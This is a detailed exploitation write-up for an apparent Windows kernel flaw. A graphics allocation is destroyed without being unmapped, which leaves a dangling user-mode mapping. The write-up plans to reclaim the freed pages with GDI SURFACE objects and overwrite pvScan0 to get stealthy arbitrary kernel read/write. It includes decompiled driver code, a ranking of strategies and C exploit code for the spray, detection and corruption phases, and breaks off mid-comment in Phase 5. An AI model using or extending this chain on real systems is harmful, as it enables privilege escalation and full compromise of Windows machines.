# Pool Reuse Analysis — VIDMM Dangling Mapping to SURFACE.pvScan0 Corruption

## 1. Executive Summary

**WINNING STRATEGY: CSectionEntry Section Page Reclaim (Option A)**

The VIDMM dangling mapping vulnerability frees physical pages from a `SEC_COMMIT` section back to the system PFN free list. SURFACE type isolation allocates its backing sections via `MmCreateSection(SEC_COMMIT)` — the same page source. When existing CSectionEntry sections are exhausted, `CTypeIsolation<180224,704>::Allocate` creates a **new 44-page CSectionEntry section** that draws pages from the PFN free list. If freed VIDMM pages are at the top of the free list, the new CSectionEntry section reclaims them. SURFACE objects allocated from the new section land on the reclaimed pages, making them accessible through the dangling process-space VA. We corrupt `SURFACE+0x50` (pvScan0) through the dangling VA, then use `GetBitmapBits`/`SetBitmapBits` for **200M+ ops/sec arbitrary kernel R/W** — no kernel artifacts, no page table manipulation, no syscall per access.

**Key chain:**
```
VIDMM SEC_COMMIT section → free pages → PFN free list
                                          ↓
CSectionEntry::Create → MmCreateSection(SEC_COMMIT, 0x2C000) → gets 44 pages from PFN
                                          ↓
CSectionBitmapAllocator → SURFACE at slot offset on reclaimed page
                                          ↓
Dangling process VA → same physical page → corrupt SURFACE+0x50 (pvScan0)
                                          ↓
GetBitmapBits/SetBitmapBits → arbitrary kernel R/W at 200M+ ops/sec
```

---

## 2. VIDMM Backing Page Pool Analysis

### 2.1 LockInternal — Type 5 Allocation Path

**Function:** `VIDMM_GLOBAL::LockInternal` @ `dxgmms2.sys:0x1C006BEB0`

For type 5 (`*(_DWORD *)a2 == 5`), the function checks allocation flags at `VIDMM_ALLOC+0x1F0`:

```c
v16 = **(_DWORD **)(v13 + 496);  // flags at VIDMM_ALLOC+0x1F0
if ( (v16 & 0x20000000) != 0 )
{
    // PARAVIRTUALIZED PATH: MmMapViewOfSection
    v28 = nullptr;
    CurrentProcess = PsGetCurrentProcess();
    LODWORD(v11) = MmMapViewOfSection(
         *(_QWORD *)(v13 + 352),    // section object at VIDMM_ALLOC+0x160
         CurrentProcess,             // target process
         v12 + 2,                    // base address output → multi_alloc+0x10
         0,                          // zero_bits
         *(_QWORD *)(v13 + 8),      // commit size = allocation size
         &v28,                       // section offset
         v13 + 8,                    // view size
         2,                          // ViewShare
         0,                          // allocation type
         ~((_WORD)v16 << 8) & 0x400 | 4u);  // protection (PAGE_READWRITE)
}
else
{
    // NON-PARAVIRTUALIZED PATH: GPU driver vtable call
    v18 = (*(__int64 (__fastcall **)(...))(**(_QWORD **)(v12[1] + 24) + 72LL))(
            *(_QWORD *)(v12[1] + 24),  // adapter driver object
            v12[3],                     // allocation info
            *(_QWORD *)(v13 + 8));     // size
    v12[2] = v18;  // CPU VA stored at multi_alloc+0x10
}
```

**Key findings:**
- **Paravirtualized path (0x20000000):** Uses `MmMapViewOfSection` with a section object at `VIDMM_ALLOC+0x160` (offset 352). Maps the section into the **process address space** (not session space). CPU VA stored at `multi_alloc+0x10`.
- **Non-paravirtualized path:** Calls GPU driver vtable function at offset +72. Result stored at `multi_alloc+0x10`. Uses MDL-based mapping (MDL at `VIDMM_GLOBAL_ALLOC+0x68`).

**After successful lock (LABEL_20):**
```c
v24 = *(_DWORD *)(v13 + 80);  // flags at VIDMM_ALLOC+0x50
if ( (v24 & 0x4000) != 0 )
    v25 = *(void **)(v13 + 528);     // use pre-existing VA at +0x210
else if ( (v24 & 0x2000) != 0 )
    LockParavirtualizedAllocationOnHost(...);  // another paravirt path
else
{
    v15 = **(unsigned int **)(v13 + 496);
    if ( (v15 & 8) != 0 )
        v25 = *(void **)(v13 + 360);  // use VA at VIDMM_ALLOC+0x168
    else
        v25 = (void *)v12[2];         // use multi_alloc+0x10 (our controlled VA)
}
*a4 = v25;  // Return CPU VA to caller
```

### 2.2 Section Object Creation

**Function:** `DXGDEVICE::CreateVidMmAllocations` @ `dxgkrnl.sys:0x1C0156710`

The section object at `VIDMM_ALLOC+0x160` is created during allocation setup:

1. **User-provided section** (`Flags & 0x20`): Uses `hSection` from `D3DDDI_ALLOCATIONINFO2` via `ObReferenceObjectByHandle` with `MmSectionObjectType`
2. **Standard allocation** (`Flags & 0x400000`): Calls callback at `a6+4` (standard allocation creator)
3. **Paravirtualized** (`Flags & 0x4000`): Uses pre-existing section from adapter

All paths result in a section object reference stored in the allocation's VidMm info. The section is **SEC_COMMIT** (pagefile-backed), meaning its physical pages come from the system PFN free list.

### 2.3 Destroy Path — The Vulnerability

**Function:** `VIDMM_GLOBAL::CloseOneAllocation` @ `dxgmms2.sys:0x1C006A8D0`

```c
// CHECK 1: VIDMM_ALLOC+0x90 (WRONG FIELD for type 5)
v19 = *(_QWORD *)&a2[6].Header.Lock;  // VIDMM_ALLOC+0x90
if ( v19 )
{
    // Only unmaps if flags have 0x10000008 set
    if ( (**(_DWORD **)(v12 + 496) & 0x10000008) != 0 )
        MmUnmapViewOfSection(**(_QWORD **)(*(_QWORD *)&a2->Header.Lock + 8LL), v19);
    *(_QWORD *)&a2[6].Header.Lock = 0;
}
```

For type 5 with `0x20000000` flag:
- `VIDMM_ALLOC+0x90` is **NULL** (CPU VA is at `multi_alloc+0x10`, not +0x90)
- Flag mask `0x10000008` does NOT include `0x20000000`
- **MmUnmapViewOfSection is NEVER called** — the process VA mapping persists

```c
// CHECK 2: UncommitLocalBackingStore (conditional)
if ( (*(_DWORD *)(v28 + 84) & 0x40) != 0 )
    VIDMM_GLOBAL::UncommitLocalBackingStore(this, v25, v26);
```

**Function:** `VIDMM_GLOBAL::UncommitLocalBackingStore` @ `dxgmms2.sys:0x1C0088EDC`

```c
v8 = *(_DWORD *)(v5 + 80);  // VIDMM_ALLOC+0x50 flags
if ( (v8 & 0x2000) == 0 )   // Skip if paravirtualized (0x2000 set)
{
    if ( (v8 & 0x400) == 0 && ((v8 & 0x40000) != 0 || (**(DWORD**)(v5+496) & 0x40000) != 0) )
    {
        if ( a3 )  // a3 = v26 = (a3_param == nullptr) → true for full destroy
        {
            v11 = *((_QWORD *)a2 + 2);  // VIDMM_LOCAL_ALLOC+0x10
            if ( v11 )
                MmUnmapViewOfSection(PsGetCurrentProcess(), v11);
        }
    }
}
```

For type 5 paravirtualized:
- `(v8 & 0x2000)` might be set → **skip entire unmap block**
- Even if not set, `VIDMM_LOCAL_ALLOC+0x10` may be NULL (CPU VA is at `multi_alloc+0x10`)
- **The CPU VA at `multi_alloc+0x10` is NEVER unmapped**

### 2.4 Backing Page Pool Determination

**VIDMM backing pages come from:**
- `MmCreateSection` with `SEC_COMMIT` (AllocationAttributes = 0x4)
- Section backed by **pagefile/system pages**
- Physical pages allocated from the **system PFN free list**
- When section is destroyed/dereferenced, pages return to **PFN free list**
- The PFN free list is the universal source for ALL kernel memory allocations

**VIDMM_LOCAL_ALLOC::UnlockAllocationBackingStore** @ `dxgmms2.sys:0x1C0066444`:
```c
// Called only from D3DKMTUnlock (which we never call)
VidMmiUnlockAllocation(MDL);  // MmUnlockPages + ExFreePoolWithTag(MDL)
```

**VidMmiUnlockAllocation** @ `dxgmms2.sys:0x1C00627D4`:
```c
MmUnlockPages(a1[1]);           // Release pages from MDL
ExFreePoolWithTag(a1[1], 0);   // Free MDL itself
operator delete(a1);            // Free VIDMM_MDL wrapper
```

Since we never call `D3DKMTUnlock`, the MDL is never unlocked and the mapping persists.

### 2.5 Result: Dangling Process-Space VA

After `D3DKMTDestroyAllocation` (without `D3DKMTUnlock`):
1. Section pages are freed to the **PFN free list**
2. Process PTE at the CPU VA (from `MmMapViewOfSection`) **still maps to the freed physical page**
3. The PTE present bit is still set — hardware will honor the mapping
4. TLB entries may persist or be re-walked from the valid PTE
5. **Any kernel allocation that reclaims the physical page is accessible through the dangling VA**

---

## 3. GDI Object Pool Analysis

### 3.1 SURFACE Objects — Type Isolation

**Function:** `SURFACE::Allocate` @ `win32kbase.sys:0x1C00808C0`

```c
v0 = (__int64)*gpTypeIsolation;  // CLookAsideTypeIsolation<180224,704>*
if ( *gpTypeIsolation )
{
    v1 = ExpInterlockedPopEntrySList((PSLIST_HEADER)(v0 + 48));  // Try SLIST free list
    if ( !v1 )
    {
        // SLIST empty → call lookaside Allocate callback at v0+96
        v1 = (*(...)(v0 + 96))(
              *(unsigned int *)(v0 + 84),   // pool type (NonPagedPoolNx)
              *(unsigned int *)(v0 + 92),   // tag ("Gila")
              *(unsigned int *)(v0 + 88),   // size (704)
              v0 + 48);                      // lookaside list
    }
}
```

**Lookaside Allocate Callback (Lambda)** @ `win32kbase.sys:0x1C009CFF0`:
```c
// The lambda does NOT call ExAllocatePoolWithTag!
// It calls CTypeIsolation::Allocate:
return NSInstrumentation::CTypeIsolation<180224,704>::Allocate(
    &Lookaside[-1].L.AllocateEx, NumberOfBytes, Tag);
```

**CTypeIsolation<180224,704>::Allocate** @ `win32kbase.sys:0x1C0149198`:
```c
if ( debug_mode )  // *((_BYTE *)a1 + 36)
{
    // Debug path: use separate lookaside with NonPagedPoolNx fallback
    result = ExpInterlockedPopEntrySList((PSLIST_HEADER)a1[3]);
    if ( !result )
        result = ((...)(a1[3][6]))(...);  // ExAllocatePoolWithTag(NonPagedPoolNx, "Gila")
}
else
{
    // NORMAL PATH: iterate CSectionEntry list
    AcquireShared(a1[2]);  // RW lock
    for ( i = *a1; i != a1; i = *i )  // Walk section entry list
    {
        v5 = CSectionBitmapAllocator<180224,704>::Allocate(i[4]);  // Try each section
        if ( v5 )
        {
            ReleasePushLockShared(a1[2]);
            return v5;  // Found free slot
        }
    }
    ReleasePushLockShared(a1[2]);

    // ALL existing sections full → CREATE NEW CSectionEntry
    v6 = CSectionEntry<180224,704>::Create();
    if ( v6 )
    {
        v3 = CSectionBitmapAllocator<180224,704>::Allocate(*((__int64 **)v6 + 4));
        if ( v3 )
        {
            // Link new section into list
            AcquirePushLockExclusive(a1[2]);
            // ... list insertion ...
            *(_DWORD *)(a1 + 32) += 220;  // Increment total slot count
            ReleasePushLockExclusive(a1[2]);
        }
    }
    return v3;
}
```

**CRITICAL:** In normal mode, SURFACE objects are ALWAYS allocated from **CSectionEntry sections** (session-mapped SEC_COMMIT sections), NOT from the regular NonPagedPoolNx pool.

### 3.2 CSectionEntry Section Creation

**Function:** `CSectionEntry<180224,704>::Create` @ `win32kbase.sys:0x1C00A1DF0`
```c
PoolWithTag = ExAllocatePoolWithTag(PagedPoolSession, 0x28u, 0x6F736955u);  // Control struct (40 bytes)
// Tag "Uiso" (0x6F736955)
CSectionEntry<180224,704>::Initialize(PoolWithTag);
```

**Function:** `CSectionEntry<180224,704>::Initialize` @ `win32kbase.sys:0x1C00A1E4C`
```c
Section = PlatformCreateSection(0x2C000, a2);  // 180,224 bytes = 44 pages
a1[2] = Section;
PlatformMapViewInSessionSpace(Section, a1 + 3, 0x2C000);
v5 = CSectionBitmapAllocator<180224,704>::Create(a1[3]);  // Bitmap allocator on mapped memory
a1[4] = v5;
```

**Function:** `PlatformCreateSection` @ `win32kbase.sys:0x1C00A202C`
```c
MmCreateSection(&Object, 983071, 0, &v4, 4, 0x4000000, 0, 0);
// Parameters:
//   DesiredAccess = 0xF007F (SECTION_ALL_ACCESS)
//   ObjectAttributes = NULL
//   MaximumSize = 0x2C000 (180,224 bytes)
//   AllocationAttributes = SEC_COMMIT (0x4)
//   SectionPageProtection = 0x4000000
```

**Function:** `PlatformMapViewInSessionSpace` @ `win32kbase.sys:0x1C00A1FE4`
```c
MmMapViewInSessionSpace(this, a2, &ViewSize);
// Maps the section into SESSION address space
// Accessible from any process in the same session
```

### 3.3 CSectionBitmapAllocator — Slot Management

**Function:** `CSectionBitmapAllocator<180224,704>::Allocate` @ `win32kbase.sys:0x1C0081534`

```c
KeEnterCriticalRegion();
ExAcquirePushLockExclusiveEx(v1, 0);
ClearBits = RtlFindClearBits((PRTL_BITMAP)(a1[2] ^ a1[3]), 1u, hint_index);
if ( ClearBits != -1 && CommitSlot(a1, ClearBits) )
{
    RtlSetBit((PRTL_BITMAP)(a1[2] ^ a1[3]), ClearBits);
    v4 = ((ClearBits / 5) << 12) + (a1[2] ^ a1[1]) + 704 * (ClearBits % 5);
}
ExReleasePushLockExclusiveEx(v1, 0);
KeLeaveCriticalRegion();
return v4;
```

**Slot address computation:**
```
address = (slot_index / 5) * 0x1000 + base_address + (slot_index % 5) * 704
```
- `slot_index / 5` = page index within section (0 to 43)
- `slot_index % 5` = slot within page (0 to 4)
- `base_address` = XOR-encrypted section base (`a1[2] ^ a1[1]`)

### 3.4 SURFACE Page Layout

```
Section: 0x2C000 bytes = 44 pages × 0x1000
Total slots: 220 (5 per page × 44 pages)
SURFACE size: 0x2C0 = 704 bytes

Page layout (0x1000 = 4096 bytes):
  Slot 0: offset 0x000, pvScan0 at page+0x050
  Slot 1: offset 0x2C0, pvScan0 at page+0x310
  Slot 2: offset 0x580, pvScan0 at page+0x5D0
  Slot 3: offset 0x840, pvScan0 at page+0x890
  Slot 4: offset 0xB00, pvScan0 at page+0xB50
  Padding: 0xDC0 to 0x1000 = 576 bytes (0x240)
```

### 3.5 SURFACE Key Field Offsets

| Offset | Size | Field | Notes |
|--------|------|-------|-------|
| +0x00 | 8 | SLIST_ENTRY.Next | Free list linkage |
| +0x08 | 8 | SLIST_ENTRY.Depth | |
| +0x18 | 8 | DHSURF (dhsurf) | Device surface handle (iType=3) |
| +0x30 | 4 | sizlBitmap.cx | Bitmap width |
| +0x34 | 4 | sizlBitmap.cy | Bitmap height |
| +0x40 | 4 | lDelta (stride) | Bytes per scanline |
| +0x48 | 8 | pvBits | Raw bitmap data pointer |
| **+0x50** | **8** | **pvScan0** | **Adjusted scan pointer — CORRUPTION TARGET** |
| +0x5C | 4 | ulUnique | Incrementing surface ID |
| +0x60 | 4 | iBitmapFormat | Format (1=1bpp, 4=16bpp, 6=32bpp, etc.) |
| +0x66 | 2 | flags | Surface flags |
| +0x6C | 4 | iType | 0=bitmap, 3=device bitmap |
| +0x70 | 4 | flags2 | Additional flags |
| +0x80 | 8 | hSection | Section handle (for section-backed) |
| +0xD0 | 4 | PID | Process ID & 0xFFFFFFFC |

### 3.6 DC Objects

**Function:** `AllocateObject` @ `win32kbase.sys:0x1C002BCC0`

```c
v6 = Size + 160;  // Add trace buffer if tracing
if ( laSize[a2] < v6 )
{
    // Large allocation: use PALLOCMEM2
    v11 = (a2 << 24) + 808478791;  // Pool tag = 0x30303047 | (type << 24)
    v9 = PALLOCMEM2(v6, v11, a3);
}
else
{
    // Small allocation: use lookaside list
    v7 = (&pHmgLookAsideList)[a2];
    v9 = qword_1C0256D58(v7, a2, v4);  // Lookaside allocate
}
```

**Function:** `PALLOCMEM2` @ `win32kbase.sys:0x1C002C278`
```c
v6 = Win32AllocPool((unsigned int)Size, a2);
```

**Function:** `Win32AllocPool` @ `win32kbase.sys:0x1C002C2D0`
```c
return qword_1C0256D18(33, a1, a2);  // Pool type = 33 = 0x21
```

**Pool type 0x21** = session paged pool (win32k internal encoding).

**Function:** `Win32AllocPoolNonPaged` @ `win32kbase.sys:0x1C005C490`
```c
return qword_1C0256D18(544, a1, a2);  // Pool type = 544 = 0x220 = NonPagedPoolNxCacheAligned
```

**DC size: 0x868 bytes** (from PROGRESS.md). DC is allocated from **session paged pool** (type 0x21).

### 3.7 Bitmap Data (pvScan0 Target)

**Function:** `SURFMEM::bCreateDIB` @ `win32kbase.sys:0x1C0027C60`

Multiple allocation paths for bitmap data depending on flags at `DEVBITMAPINFO+0x18`:

1. **Flag 0x8 set, 0x80 not set:** `EngAllocUserMemEx` → **user-mode memory**
2. **Flag 0x8 set, 0x80 set:** `AllocateSharedSection` → **shared section** (cross-process)
3. **Flag 0x800 set:** `Win32CreateSection` → **kernel section** (section-mapped)
4. **Flag 0x10 set:** `AllocateKernelSection` → **kernel section**
5. **Fallback (LABEL_66):** `PALLOCMEM2(size, 0x6D626B47, ...)` → **session paged pool, tag "Gkbm"**
6. **User-provided (pv != NULL):** No allocation — uses user pointer directly

**Tag "Gkbm"** (0x6D626B47): Used for bitmap pixel data in session paged pool.

### 3.8 SURFACE::Free

**Function:** `SURFACE::Free` @ `win32kbase.sys:0x1C002B8C0`
```c
if ( refcount )
    ReleaseReferenceCountedObjectHandle(0);
if ( flag_byte )
{
    v2 = bitmap_data_pointer;  // SURFACE+0x48
    if ( v2 )
        Win32FreePool(v2);  // Free bitmap data
}
FreeIsolatedType<CLookAsideTypeIsolation<180224,704>>(ListEntry);  // Push SURFACE to SLIST
```

Freed SURFACEs go back to the lookaside SLIST at `gpTypeIsolation+48`, NOT back to the CSectionEntry section bitmap. The SLIST acts as a cache — freed SURFACEs are reused before allocating new ones from CSectionEntry.

### 3.9 EngAllocMem

**Function:** `EngAllocMem` @ `win32kbase.sys:0x1C007BAC0`

```c
if ( (fl & 2) != 0 )  // NonPaged flag
    v7 = Win32AllocPoolNonPaged(v5, ulTag);  // Pool type 0x220 (NonPagedPoolNxCacheAligned)
else
    v7 = qword_1C0256D18(33, v5, ulTag);     // Pool type 0x21 (session paged pool)
```

EngAllocMem adds 32 bytes of header (for `MultiUserGreEngAllocList` tracking). The returned pointer is offset by 32 bytes from the actual allocation.

### 3.10 CreateDriverSurfMem (Device Bitmaps)

**Function:** `CreateDriverSurfMem` @ `win32kbase.sys:0x1C00C9DBC`

Calls `SURFMEM::bCreateDIB` with the same allocation paths as regular bitmaps. Device bitmaps (iType=3) do NOT bypass type isolation — they use the same `SURFACE::Allocate` → `CTypeIsolation::Allocate` → `CSectionBitmapAllocator::Allocate` chain.

---

## 4. Candidate Kernel Objects for Page Reuse

### 4.1 Pool Source Summary

| Object | Pool Source | Size | User-Controllable | Reclaims VIDMM Pages? |
|--------|------------|------|-------------------|----------------------|
| **SURFACE** | CSectionEntry (SEC_COMMIT, session-mapped) | 704 bytes | Yes (CreateBitmap) | **YES** — same PFN free list |
| DC | Session paged pool (0x21) | 0x868 bytes | Yes (CreateDC) | YES — same PFN free list |
| Bitmap data | Session paged pool ("Gkbm") | Variable | Yes (CreateBitmap size) | YES — but only data, not SURFACE |
| Pipe buffer | NonPagedPool | Variable | Yes (NtWriteFile) | YES — no useful pointer fields |
| Event | Regular pool | ~0x60 bytes | Yes (NtCreateEvent) | YES — too small, no R/W pointer |
| Semaphore | Regular pool | ~0x60 bytes | Yes (NtCreateSemaphore) | YES — same issue |
| Mutant | Regular pool | ~0x60 bytes | Yes (NtCreateMutant) | YES — same issue |
| Registry value | PagedPool | Variable | Yes (NtSetValueKey) | Maybe — PagedPool, different page pool |

### 4.2 Key Insight: CSectionEntry Uses SEC_COMMIT

Both VIDMM and CSectionEntry use `MmCreateSection(SEC_COMMIT)`:
- VIDMM: Section at `VIDMM_ALLOC+0x160`, mapped into process space
- CSectionEntry: Section via `PlatformCreateSection`, mapped into session space

Both draw physical pages from the **same PFN free list**. When VIDMM pages are freed, they return to the PFN free list. When a new CSectionEntry is created, it gets 44 pages from the PFN free list — potentially including the freed VIDMM pages.

### 4.3 Why Other Objects Are Less Suitable

- **DC:** In session paged pool. Can reclaim pages, but DC surface pointer corruption requires fake SURFACE in usermode + BitBlt (slower than GetBitmapBits). Useful as fallback.
- **Pipe buffers:** No pointer fields that the kernel follows for R/W. Only useful for data injection.
- **Event/Semaphore/Mutant:** Too small (~0x60 bytes), no useful pointer fields for arbitrary R/W.
- **Bitmap data:** In session paged pool. Can reclaim pages, but corrupting bitmap data only gives pixel data control, not arbitrary kernel R/W.

---

## 5. Page Reuse Strategy Design

### Option A: CSectionEntry Section Page Reclaim (RECOMMENDED)

**Viability:** HIGH — Same pool source (SEC_COMMIT → PFN free list)
**Complexity:** MEDIUM — Need to exhaust existing sections and time new section creation
**Reliability:** HIGH with sufficient VIDMM page frees (44+ pages)
**200M+ ops/sec:** YES — Direct GetBitmapBits/SetBitmapBits through corrupted pvScan0
**No page table access:** YES — Uses existing process PTE (dangling mapping)
**Stealthy:** YES — No kernel artifacts, no driver loaded, no page table modifications

**Flow:**
1. Free many VIDMM pages → PFN free list
2. Exhaust existing CSectionEntry sections → trigger new section creation
3. New CSectionEntry gets 44 pages from PFN free list → reclaims freed VIDMM pages
4. SURFACE on reclaimed page → accessible through dangling VA
5. Corrupt SURFACE+0x50 (pvScan0) → target kernel address
6. GetBitmapBits/SetBitmapBits → 200M+ ops/sec arbitrary R/W

### Option B: Bitmap Data Buffer Reclaim

**Viability:** MEDIUM — Bitmap data in session paged pool, same PFN source
**Complexity:** LOW
**Reliability:** MEDIUM
**200M+ ops/sec:** NO — Corrupting bitmap data only gives pixel control, not arbitrary R/W
**Verdict:** Not suitable for the primary goal (pvScan0 corruption)

### Option C: DC Reclaim + Fake SURFACE

**Viability:** HIGH — DC in session paged pool, same PFN source
**Complexity:** HIGH — Need to know DC surface pointer offset, handle ref counting
**Reliability:** MEDIUM — DC might not be on the exact freed page
**200M+ ops/sec:** PARTIAL — BitBlt is slower than GetBitmapBits; need hybrid approach
**Verdict:** Viable fallback if Option A fails

**Flow:**
1. Free VIDMM pages → PFN free list
2. Spray DCs (CreateCompatibleDC) → reclaim freed pages
3. Read through dangling VA → identify DC on page
4. Corrupt DC's surface pointer → fake SURFACE in usermode
5. Fake SURFACE has pvScan0 = target address
6. Use BitBlt through corrupted DC (SMAP disabled in win32k)
7. Hybrid: use BitBlt to corrupt a real bitmap's SURFACE.pvScan0, then GetBitmapBits

### Option D: Pool Header Corruption

**Viability:** LOW — Risky, can cause BSOD
**Complexity:** HIGH
**Reliability:** LOW
**Verdict:** Not recommended

### Option E: Pipe Buffer Reclaim + Data Injection

**Viability:** MEDIUM — Can reclaim pages, but no R/W pointer
**Complexity:** LOW
**200M+ ops/sec:** NO
**Verdict:** Not suitable for arbitrary R/W

### Option F: Named Pipe + SURFACE Overlap

**Viability:** LOW — Requires making GDI handle point to fake SURFACE
**Complexity:** VERY HIGH
**Verdict:** Not practical without additional vulnerabilities

### Option G: GDI Batch TOCTOU + Dangling Mapping

**Viability:** MEDIUM — TOCTOU deletes SURFACE, but freed SURFACE goes to type isolation SLIST, not freed page
**Complexity:** HIGH
**Verdict:** Doesn't directly help — freed SURFACE memory is in CSectionEntry section, not on freed VIDMM page

### Option H: Direct R/W Through Dangling Mapping

**Viability:** HIGH — Direct memory access through dangling VA
**Complexity:** LOW
**200M+ ops/sec:** NO — Limited to specific physical page(s), not arbitrary addresses
**Verdict:** Good for information leak and object identification, but not for arbitrary R/W

### Rating Summary

| Option | Viability | Complexity | Reliability | 200M+ ops/sec | Stealthy |
|--------|-----------|------------|-------------|---------------|----------|
| **A (CSectionEntry)** | **HIGH** | **MEDIUM** | **HIGH** | **YES** | **YES** |
| C (DC + fake SURFACE) | HIGH | HIGH | MEDIUM | PARTIAL | YES |
| H (Direct R/W) | HIGH | LOW | HIGH | NO | YES |
| B (Bitmap data) | MEDIUM | LOW | MEDIUM | NO | YES |
| E (Pipe buffer) | MEDIUM | LOW | MEDIUM | NO | YES |

---

## 6. Best Option — Detailed Exploitation Plan (Option A)

### 6.1 Phase 1: Create Dangling Mappings

**Goal:** Free many physical pages to the PFN free list while retaining process-space VAs.

```c
// Create N VIDMM allocations (type 5, non-CPU-visible, 1 page each)
// N >= 44 to match one CSectionEntry section size
#define NUM_ALLOCATIONS 128

D3DKMT_CREATEALLOCATION createAlloc = {0};
D3DDDI_ALLOCATIONINFO2 allocInfo = {0};

for (int i = 0; i < NUM_ALLOCATIONS; i++) {
    // Set up allocation with type 5, non-CPU-visible
    // Use D3DKMT_CREATEALLOCATIONFLAGS with appropriate flags
    // Allocation size = 0x1000 (1 page) for precise page-level control

    D3DKMTCreateAllocation(&createAlloc);  // Create allocation
}

// Lock each allocation (type 5, non-CPU-visible)
D3DKMT_LOCK lockData = {0};
for (int i = 0; i < NUM_ALLOCATIONS; i++) {
    lockData.hAllocation = allocations[i].hAllocation;
    lockData.Flags.LockType = 5;        // Type 5
    lockData.Flags.IsNonCPUVisible = 1; // Non-CPU-visible
    D3DKMTLock(&lockData);
    // lockData.pData = CPU VA (stored at multi_alloc+0x10)
    danglingVAs[i] = lockData.pData;    // Save the CPU VA
}

// Destroy ALL allocations WITHOUT calling D3DKMTUnlock
D3DKMT_DESTROYALLOCATION2 destroyAlloc = {0};
for (int i = 0; i < NUM_ALLOCATIONS; i++) {
    destroyAlloc.hDevice = hDevice;
    destroyAlloc.hResource = hResource;
    D3DKMTDestroyAllocation2(&destroyAlloc);
    // Pages freed to PFN free list
    // Process PTEs persist → danglingVAs[i] still valid
}
```

**Result:** 128 physical pages freed to PFN free list, 128 dangling process-space VAs.

### 6.2 Phase 2: Exhaust CSectionEntry Sections

**Goal:** Fill all existing CSectionEntry SURFACE slots to force new section creation.

```c
// Each CSectionEntry has 220 slots
// Unknown how many sections exist at startup (typically 1-3)
// Create enough bitmaps to fill all existing slots

HBITMAP bitmaps[4096];  // Large array
int bitmapCount = 0;

// Phase 2a: Create bitmaps to drain the SLIST and fill existing sections
for (int i = 0; i < 4096; i++) {
    bitmaps[i] = CreateBitmap(1, 1, 1, 1, NULL);  // 1x1 1bpp bitmap (smallest SURFACE)
    bitmapCount++;
    // Each CreateBitmap allocates a SURFACE from type isolation
    // First drains SLIST, then fills CSectionEntry sections
    // After 220 * num_existing_sections, new sections are created
}
```

### 6.3 Phase 3: Trigger New CSectionEntry Creation + Reclaim

**Goal:** New CSectionEntry sections draw pages from PFN free list, reclaiming freed VIDMM pages.

```c
// Continue creating bitmaps beyond existing section capacity
// Each new CSectionEntry needs 44 pages from PFN free list
// With 128 freed VIDMM pages, probability of reclaim is high

// After each batch of ~220 bitmaps (one section), check dangling VAs
for (int batch = 0; batch < 10; batch++) {
    // Create 220 more bitmaps (fills one new CSectionEntry)
    for (int i = 0; i < 220; i++) {
        bitmaps[bitmapCount++] = CreateBitmap(1, 1, 1, 1, NULL);
    }

    // Check all dangling VAs for SURFACE signatures
    for (int va_idx = 0; va_idx < NUM_ALLOCATIONS; va_idx++) {
        uint8_t* va = (uint8_t*)danglingVAs[va_idx];

        // Check each of the 5 possible SURFACE slot offsets within the page
        for (int slot = 0; slot < 5; slot++) {
            uint8_t* surfAddr = va + slot * 0x2C0;

            // Verify SURFACE signature:
            // Check iBitmapFormat (offset 0x60) — should be 1-9
            uint32_t format = *(uint32_t*)(surfAddr + 0x60);
            if (format < 1 || format > 9)
                continue;

            // Check lDelta (offset 0x40) — should be positive and small for 1x1 bitmap
            int32_t lDelta = *(int32_t*)(surfAddr + 0x40);
            if (lDelta <= 0 || lDelta > 0x1000)
                continue;

            // Check pvScan0 (offset 0x50) — should be a valid kernel pointer
            uint64_t pvScan0 = *(uint64_t*)(surfAddr + 0x50);
            if (pvScan0 == 0 || (pvScan0 & 0xFFFF000000000000) == 0)
                continue;

            // Check ulUnique (offset 0x5C) — should be a reasonable counter
            uint32_t ulUnique = *(uint32_t*)(surfAddr + 0x5C);
            if (ulUnique == 0)
                continue;

            // SURFACE FOUND on this dangling VA page!
            // Record the bitmap handle and slot offset
            // The bitmap handle corresponds to the most recently created bitmaps
            printf("SURFACE found at VA %p, slot %d, pvScan0=%p\n",
                   va, slot, pvScan0);

            // Identify which bitmap handle owns this SURFACE:
            // The SURFACE's HMG handle is at SURFACE+0x20 (the object header)
            // Use NtGdiGetBitmapBits on candidate bitmaps to verify match
        }
    }
}
```

### 6.4 Phase 4: Identify Bitmap Handle

The dangling VA gives us the SURFACE memory, but we need the corresponding HBITMAP handle to call GetBitmapBits/SetBitmapBits.

**Method 1: Brute-force verification**
```c
// For each recently created bitmap, read its pvScan0 through the dangling VA
// and compare with GetBitmapBits output

uint8_t testBuf[4] = {0};
for (int i = bitmapCount - 220; i < bitmapCount; i++) {
    // Get 1 byte from the bitmap
    LONG result = GetBitmapBits(bitmaps[i], 1, testBuf);

    // For each SURFACE found on dangling pages, compare the first byte
    // at pvScan0 with what GetBitmapBits returned
    // If they match, bitmaps[i] corresponds to this SURFACE
}
```

**Method 2: Read SURFACE header through dangling VA**
```c
// The SURFACE object header (before SURFACE+0x00) contains the HMG handle
// SURFACE is embedded in an OBJECT structure:
//   OBJECT+0x00: BASEOBJECT header (16 bytes)
//   OBJECT+0x10: SURFACE data starts here
// But in type isolation, the SURFACE starts at the slot address directly
// The HMG handle is stored in the object header

// Read the HMG handle from the SURFACE's object header
// The handle is at SURFACE - 0x10 + some offset in the BASEOBJECT
// Or use the SURFACE's hSection/unique ID to correlate
```

**Method 3: Timing correlation**
```c
// Create bitmaps one at a time, checking dangling VAs after each creation
// When a new SURFACE appears on a dangling VA, the most recently created bitmap is the match

HBITMAP lastBitmap = NULL;
for (int i = 0; i < 220; i++) {
    lastBitmap = CreateBitmap(1, 1, 1, 1, NULL);

    // Check dangling VAs for new SURFACE
    for (int va_idx = 0; va_idx < NUM_ALLOCATIONS; va_idx++) {
        // Check if a new SURFACE appeared (pvScan0 changed from 0 to non-zero)
        // If found, lastBitmap is the handle
    }
}
```

### 6.5 Phase 5: Corrupt pvScan0 for Arbitrary R/W

```c
// Once we have:
// - danglingVA: process VA mapping to the SURFACE's physical page
// - slotOffset: offset of the SURFACE within the page (0, 0x2C0, 0x580, 0x840, 0xB00)
// - hbitmap: HBITMAP handle for the SURFACE

uint8_t* surfaceAddr = (uint8_t*)danglingVA + slotOffset;

// READ arbitrary kernel address:
uint64_t targetReadAddr = 0xFFFFF12345678900;  // Target kernel address

// Step 1: Save original pvScan0
uint64_t origPvScan0 = *(uint64_t*)(surfaceAddr + 0x50);

// Step 2: Overwrite pvScan0 with target address
*(uint64_t*)(surfaceAddr + 0x50) = targetReadAddr;

// Step 3: Read from target address via GetBitmapBits
uint8_t readBuf[4096];
LONG bytesRead = GetBitmapBits(hbitmap, sizeof(readBuf), readBuf);
// GetBitmapBits calls bDoGetSetBitmapBits which uses:
